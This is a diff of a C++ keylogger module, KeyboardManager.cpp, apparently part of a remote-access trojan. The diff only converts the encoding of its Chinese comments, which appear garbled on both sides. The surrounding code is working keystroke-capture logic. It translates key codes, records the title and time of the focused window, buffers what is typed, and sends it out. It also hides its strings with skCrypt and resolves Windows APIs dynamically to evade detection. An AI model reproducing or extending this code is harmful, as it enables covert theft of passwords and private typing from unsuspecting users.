@@ -1,4 +1,4 @@
-// KeyboardManager.cpp: implementation of the CKeyboardManager class.
+ï»¿// KeyboardManager.cpp: implementation of the CKeyboardManager class.
 //
 //////////////////////////////////////////////////////////////////////
 
@@ -141,14 +141,14 @@ int CKeyboardManager1::sendKeyBoardData(LPBYTE lpData, UINT nSize)
     return nRet;
 }
 
-std::string GetKey(int Key) // ÅÐ¶Ï¼üÅÌ°´ÏÂÊ²Ã´¼ü
+std::string GetKey(int Key) // åˆ¤æ–­é”®ç›˜æŒ‰ä¸‹ä»€ä¹ˆé”®
 {
     GET_PROCESS(DLLS[USER32], GetKeyState);
     std::string KeyString = "";
-    //ÅÐ¶Ï·ûºÅÊäÈë
-    const int KeyPressMask=0x80000000; //¼üÅÌÑÚÂë³£Á¿
-    int iShift=GetKeyState(0x10); //ÅÐ¶ÏShift¼ü×´Ì¬
-    bool IS=(iShift & KeyPressMask)==KeyPressMask; //±íÊ¾°´ÏÂShift¼ü
+    //åˆ¤æ–­ç¬¦å·è¾“å…¥
+    const int KeyPressMask=0x80000000; //é”®ç›˜æŽ©ç å¸¸é‡
+    int iShift=GetKeyState(0x10); //åˆ¤æ–­Shifté”®çŠ¶æ€
+    bool IS=(iShift & KeyPressMask)==KeyPressMask; //è¡¨ç¤ºæŒ‰ä¸‹Shifté”®
     if(Key >=186 && Key <=222) {
         switch(Key) {
         case 186:
@@ -219,10 +219,10 @@ std::string GetKey(int Key) // ÅÐ¶Ï¼üÅÌ°´ÏÂÊ²Ã´¼ü
             break;
         }
     }
-    //ÅÐ¶Ï¼üÅÌµÄµÚÒ»ÐÐ
-    if (Key == VK_ESCAPE) // ÍË³ö
+    //åˆ¤æ–­é”®ç›˜çš„ç¬¬ä¸€è¡Œ
+    if (Key == VK_ESCAPE) // é€€å‡º
         KeyString = skCrypt("[Esc]");
-    else if (Key == VK_F1) // F1ÖÁF12
+    else if (Key == VK_F1) // F1è‡³F12
         KeyString = skCrypt("[F1]");
     else if (Key == VK_F2)
         KeyString = skCrypt("[F2]");
@@ -246,61 +246,61 @@ std::string GetKey(int Key) // ÅÐ¶Ï¼üÅÌ°´ÏÂÊ²Ã´¼ü
         KeyString = skCrypt("[F11]");
     else if (Key == VK_F12)
         KeyString = skCrypt("[F12]");
-    else if (Key == VK_SNAPSHOT) // ´òÓ¡ÆÁÄ»
+    else if (Key == VK_SNAPSHOT) // æ‰“å°å±å¹•
         KeyString = skCrypt("[PrScrn]");
-    else if (Key == VK_SCROLL) // ¹ö¶¯Ëø¶¨
+    else if (Key == VK_SCROLL) // æ»šåŠ¨é”å®š
         KeyString = skCrypt("[Scroll Lock]");
-    else if (Key == VK_PAUSE) // ÔÝÍ£¡¢ÖÐ¶Ï
+    else if (Key == VK_PAUSE) // æš‚åœã€ä¸­æ–­
         KeyString = skCrypt("[Pause]");
-    else if (Key == VK_CAPITAL) // ´óÐ´Ëø¶¨
+    else if (Key == VK_CAPITAL) // å¤§å†™é”å®š
         KeyString = skCrypt("[Caps Lock]");
 
     //-------------------------------------//
-    //¿ØÖÆ¼ü
-    else if (Key == 8) //<- »Ø¸ñ¼ü
+    //æŽ§åˆ¶é”®
+    else if (Key == 8) //<- å›žæ ¼é”®
         KeyString = skCrypt("[Backspace]");
-    else if (Key == VK_RETURN) // »Ø³µ¼ü¡¢»»ÐÐ
+    else if (Key == VK_RETURN) // å›žè½¦é”®ã€æ¢è¡Œ
         KeyString = skCrypt("[Enter]\n");
-    else if (Key == VK_SPACE) // ¿Õ¸ñ
+    else if (Key == VK_SPACE) // ç©ºæ ¼
         KeyString = skCrypt(" ");
-    //ÉÏµµ¼ü:¼üÅÌ¼ÇÂ¼µÄÊ±ºò£¬¿ÉÒÔ²»¼ÇÂ¼¡£µ¥¶ÀµÄShiftÊÇ²»»áÓÐÈÎºÎ×Ö·û£¬
-    //ÉÏµµ¼üºÍ±ðµÄ¼ü×éºÏ£¬Êä³öÊ±ÓÐ×Ö·ûÊä³ö
+    //ä¸Šæ¡£é”®:é”®ç›˜è®°å½•çš„æ—¶å€™ï¼Œå¯ä»¥ä¸è®°å½•ã€‚å•ç‹¬çš„Shiftæ˜¯ä¸ä¼šæœ‰ä»»ä½•å­—ç¬¦ï¼Œ
+    //ä¸Šæ¡£é”®å’Œåˆ«çš„é”®ç»„åˆï¼Œè¾“å‡ºæ—¶æœ‰å­—ç¬¦è¾“å‡º
     /*
-    else if (Key == VK_LSHIFT) // ×ó²àÉÏµµ¼ü
+    else if (Key == VK_LSHIFT) // å·¦ä¾§ä¸Šæ¡£é”®
     KeyString = skCrypt("[Shift]");
-    else if (Key == VK_LSHIFT) // ÓÒ²àÉÏµµ¼ü
+    else if (Key == VK_LSHIFT) // å³ä¾§ä¸Šæ¡£é”®
     KeyString = skCrypt("[SHIFT]");
     */
-    /*Èç¹ûÖ»ÊÇ¶Ô¼üÅÌÊäÈëµÄ×ÖÄ¸½øÐÐ¼ÇÂ¼:¿ÉÒÔ²»ÈÃÒÔÏÂ¼üÊä³öµ½ÎÄ¼þ*/
-    else if (Key == VK_TAB) // ÖÆ±í¼ü
+    /*å¦‚æžœåªæ˜¯å¯¹é”®ç›˜è¾“å…¥çš„å­—æ¯è¿›è¡Œè®°å½•:å¯ä»¥ä¸è®©ä»¥ä¸‹é”®è¾“å‡ºåˆ°æ–‡ä»¶*/
+    else if (Key == VK_TAB) // åˆ¶è¡¨é”®
         KeyString = skCrypt("[Tab]");
-    else if (Key == VK_LCONTROL) // ×ó¿ØÖÆ¼ü
+    else if (Key == VK_LCONTROL) // å·¦æŽ§åˆ¶é”®
         KeyString = skCrypt("[Ctrl]");
-    else if (Key == VK_RCONTROL) // ÓÒ¿ØÖÆ¼ü
+    else if (Key == VK_RCONTROL) // å³æŽ§åˆ¶é”®
         KeyString = skCrypt("[CTRL]");
-    else if (Key == VK_LMENU) // ×ó»»µµ¼ü
+    else if (Key == VK_LMENU) // å·¦æ¢æ¡£é”®
         KeyString = skCrypt("[Alt]");
-    else if (Key == VK_LMENU) // ÓÒ»»µµ¼ü
+    else if (Key == VK_LMENU) // å³æ¢æ¡£é”®
         KeyString = skCrypt("[ALT]");
-    else if (Key == VK_LWIN) // ÓÒ WINDOWS ¼ü
+    else if (Key == VK_LWIN) // å³ WINDOWS é”®
         KeyString = skCrypt("[Win]");
-    else if (Key == VK_RWIN) // ÓÒ WINDOWS ¼ü
+    else if (Key == VK_RWIN) // å³ WINDOWS é”®
         KeyString = skCrypt("[WIN]");
-    else if (Key == VK_APPS) // ¼üÅÌÉÏ ÓÒ¼ü
-        KeyString = skCrypt("ÓÒ¼ü");
-    else if (Key == VK_INSERT) // ²åÈë
+    else if (Key == VK_APPS) // é”®ç›˜ä¸Š å³é”®
+        KeyString = skCrypt("å³é”®");
+    else if (Key == VK_INSERT) // æ’å…¥
         KeyString = skCrypt("[Insert]");
-    else if (Key == VK_DELETE) // É¾³ý
+    else if (Key == VK_DELETE) // åˆ é™¤
         KeyString = skCrypt("[Delete]");
-    else if (Key == VK_HOME) // ÆðÊ¼
+    else if (Key == VK_HOME) // èµ·å§‹
         KeyString = skCrypt("[Home]");
-    else if (Key == VK_END) // ½áÊø
+    else if (Key == VK_END) // ç»“æŸ
         KeyString = skCrypt("[End]");
-    else if (Key == VK_PRIOR) // ÉÏÒ»Ò³
+    else if (Key == VK_PRIOR) // ä¸Šä¸€é¡µ
         KeyString = skCrypt("[PgUp]");
-    else if (Key == VK_NEXT) // ÏÂÒ»Ò³
+    else if (Key == VK_NEXT) // ä¸‹ä¸€é¡µ
         KeyString = skCrypt("[PgDown]");
-    // ²»³£ÓÃµÄ¼¸¸ö¼ü:Ò»°ã¼üÅÌÃ»ÓÐ
+    // ä¸å¸¸ç”¨çš„å‡ ä¸ªé”®:ä¸€èˆ¬é”®ç›˜æ²¡æœ‰
     else if (Key == VK_CANCEL) // Cancel
         KeyString = skCrypt("[Cancel]");
     else if (Key == VK_CLEAR) // Clear
@@ -313,17 +313,17 @@ std::string GetKey(int Key) // ÅÐ¶Ï¼üÅÌ°´ÏÂÊ²Ã´¼ü
         KeyString = skCrypt("[Execute]");
 
     //----------------------------------------//
-    else if (Key == VK_LEFT) //ÉÏ¡¢ÏÂ¡¢×ó¡¢ÓÒ¼ü
-        KeyString = skCrypt("[¡û]");
+    else if (Key == VK_LEFT) //ä¸Šã€ä¸‹ã€å·¦ã€å³é”®
+        KeyString = skCrypt("[â†]");
     else if (Key == VK_RIGHT)
-        KeyString = skCrypt("[¡ú]");
+        KeyString = skCrypt("[â†’]");
     else if (Key == VK_UP)
-        KeyString = skCrypt("[¡ü]");
+        KeyString = skCrypt("[â†‘]");
     else if (Key == VK_DOWN)
-        KeyString = skCrypt("[¡ý]");
-    else if (Key == VK_NUMLOCK)//Ð¡¼üÅÌÊýÂëËø¶¨
+        KeyString = skCrypt("[â†“]");
+    else if (Key == VK_NUMLOCK)//å°é”®ç›˜æ•°ç é”å®š
         KeyString = skCrypt("[NumLock]");
-    else if (Key == VK_ADD) // ¼Ó¡¢¼õ¡¢³Ë¡¢³ý
+    else if (Key == VK_ADD) // åŠ ã€å‡ã€ä¹˜ã€é™¤
         KeyString = skCrypt("+");
     else if (Key == VK_SUBTRACT)
         KeyString = skCrypt("-");
@@ -331,9 +331,9 @@ std::string GetKey(int Key) // ÅÐ¶Ï¼üÅÌ°´ÏÂÊ²Ã´¼ü
         KeyString = skCrypt("*");
     else if (Key == VK_DIVIDE)
         KeyString = skCrypt("/");
-    else if (Key == 190 || Key == 110) // Ð¡¼üÅÌ . ¼°¼üÅÌ .
+    else if (Key == 190 || Key == 110) // å°é”®ç›˜ . åŠé”®ç›˜ .
         KeyString = skCrypt(".");
-    //Ð¡¼üÅÌÊý×Ö¼ü:0-9
+    //å°é”®ç›˜æ•°å­—é”®:0-9
     else if (Key == VK_NUMPAD0)
         KeyString = skCrypt("0");
     else if (Key == VK_NUMPAD1)
@@ -357,20 +357,20 @@ std::string GetKey(int Key) // ÅÐ¶Ï¼üÅÌ°´ÏÂÊ²Ã´¼ü
     //-------------------------------------------//
 
     //-------------------------------------------//
-    //*¶Ô×ÖÄ¸µÄ´óÐ¡Ð´½øÐÐÅÐ¶Ï*//
-    else if (Key >=97 && Key <= 122) { // ×ÖÄ¸:a-z
-        if (GetKeyState(VK_CAPITAL)) { // ´óÐ´Ëø¶¨
-            if(IS) //Shift°´ÏÂ:ÎªÐ¡Ð´×ÖÄ¸
+    //*å¯¹å­—æ¯çš„å¤§å°å†™è¿›è¡Œåˆ¤æ–­*//
+    else if (Key >=97 && Key <= 122) { // å­—æ¯:a-z
+        if (GetKeyState(VK_CAPITAL)) { // å¤§å†™é”å®š
+            if(IS) //ShiftæŒ‰ä¸‹:ä¸ºå°å†™å­—æ¯
                 KeyString = Key;
-            else // Ö»ÓÐ´óÐ´Ëø¶¨:Êä³ö´óÐ´×ÖÄ¸
+            else // åªæœ‰å¤§å†™é”å®š:è¾“å‡ºå¤§å†™å­—æ¯
                 KeyString = Key - 32;
-        } else { // ´óÐ´Ã»ÓÐËø¶¨
-            if(IS) // °´ÏÂShift¼ü: ´óÐ´×ÖÄ¸
+        } else { // å¤§å†™æ²¡æœ‰é”å®š
+            if(IS) // æŒ‰ä¸‹Shifté”®: å¤§å†™å­—æ¯
                 KeyString = Key - 32;
-            else // Ã»ÓÐ°´Shift¼ü: Ð¡Ð´×ÖÄ¸
+            else // æ²¡æœ‰æŒ‰Shifté”®: å°å†™å­—æ¯
                 KeyString = Key;
         }
-    } else if (Key >=48 && Key <= 57) { // ¼üÅÌÊý×Ö:0-9¼°ÉÏ·½µÄ·ûºÅ
+    } else if (Key >=48 && Key <= 57) { // é”®ç›˜æ•°å­—:0-9åŠä¸Šæ–¹çš„ç¬¦å·
         if(IS) {
             switch(Key) {
             case 48: //0
@@ -408,13 +408,13 @@ std::string GetKey(int Key) // ÅÐ¶Ï¼üÅÌ°´ÏÂÊ²Ã´¼ü
             KeyString = Key;
     }
     if (Key != VK_LBUTTON || Key != VK_RBUTTON) {
-        if (Key >=65 && Key <=90) { //ASCII 65-90 ÎªA-Z
-            if (GetKeyState(VK_CAPITAL)) { // ´óÐ´Ëø¶¨:Êä³öA-Z
-                if(IS) // ´óÐ´Ëø¶¨£¬²¢ÇÒ°´ÏÂÉÏµµ¼ü:Êä³öÎªÐ¡Ð´×ÖÄ¸
+        if (Key >=65 && Key <=90) { //ASCII 65-90 ä¸ºA-Z
+            if (GetKeyState(VK_CAPITAL)) { // å¤§å†™é”å®š:è¾“å‡ºA-Z
+                if(IS) // å¤§å†™é”å®šï¼Œå¹¶ä¸”æŒ‰ä¸‹ä¸Šæ¡£é”®:è¾“å‡ºä¸ºå°å†™å­—æ¯
                     KeyString = Key + 32;
-                else //Ö»ÓÐ´óÐ´Ëø¶¨:Êä³öÎª´óÐ´×ÖÄ¸
+                else //åªæœ‰å¤§å†™é”å®š:è¾“å‡ºä¸ºå¤§å†™å­—æ¯
                     KeyString = Key;
-            } else { // ´óÐ´Ã»ÓÐËø¶¨:a-z
+            } else { // å¤§å†™æ²¡æœ‰é”å®š:a-z
                 if(IS) {
                     KeyString = Key;
                 } else {
@@ -438,7 +438,7 @@ BOOL CKeyboardManager1::IsWindowsFocusChange(HWND &PreviousFocus, TCHAR *WindowC
             if (hasData) {
                 SYSTEMTIME   s;
                 GetLocalTime(&s);
-                sprintf(szText, _T("\r\n[±êÌâ:] %s\r\n[Ê±¼ä:]%d-%02d-%02d  %02d:%02d:%02d\r\n"),
+                sprintf(szText, _T("\r\n[æ ‡é¢˜:] %s\r\n[æ—¶é—´:]%d-%02d-%02d  %02d:%02d:%02d\r\n"),
                         WindowCaption,s.wYear,s.wMonth,s.wDay,s.wHour,s.wMinute,s.wSecond);
             }
             memset(WindowCaption, 0, CAPTION_SIZE);
@@ -593,16 +593,16 @@ DWORD WINAPI CKeyboardManager1::KeyLogger(LPVOID lparam)
         int num = lstrlen(KeyBuffer);
         if (pThis->IsWindowsFocusChange(PreviousFocus, WindowCaption, szText, num > 0) || num > 2000) {
             bool newWindowInput = strlen(szText);
-            if (newWindowInput) { // ÔÚÐÂµÄ´°¿ÚÓÐ¼üÅÌÊäÈë
+            if (newWindowInput) { // åœ¨æ–°çš„çª—å£æœ‰é”®ç›˜è¾“å…¥
                 lstrcat(KeyBuffer, szText);
                 memset(szText, 0, sizeof(szText));
             }
             if (lstrlen(KeyBuffer) > 0) {
                 if (!newWindowInput)
                     lstrcat(KeyBuffer, _T("\r\n"));
-                const int offset = sizeof(_T("\r\n[ÄÚÈÝ:]")) - 1;
+                const int offset = sizeof(_T("\r\n[å†…å®¹:]")) - 1;
                 memmove(KeyBuffer+offset, KeyBuffer, strlen(KeyBuffer));
-                memcpy(KeyBuffer, _T("\r\n[ÄÚÈÝ:]"), offset);
+                memcpy(KeyBuffer, _T("\r\n[å†…å®¹:]"), offset);
                 pThis->m_Buffer->Write(KeyBuffer, strlen(KeyBuffer));
                 memset(KeyBuffer,0,sizeof(KeyBuffer));
             }
